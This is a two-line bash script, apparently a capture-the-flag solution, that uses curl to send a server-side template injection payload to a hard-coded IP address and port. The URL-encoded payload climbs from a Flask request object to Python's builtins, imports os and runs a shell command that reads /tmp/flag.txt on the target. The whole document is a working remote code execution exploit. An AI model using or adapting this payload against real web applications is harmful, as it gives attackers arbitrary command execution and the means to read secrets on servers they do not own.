#!/bin/bash

/bin/curl 'http://213.177.18.70:8005/?c=%7B%7Brequest.application.__globals__.__builtins__.__import__("os").popen("cat+/tmp/flag.txt").read()%7D%7D'
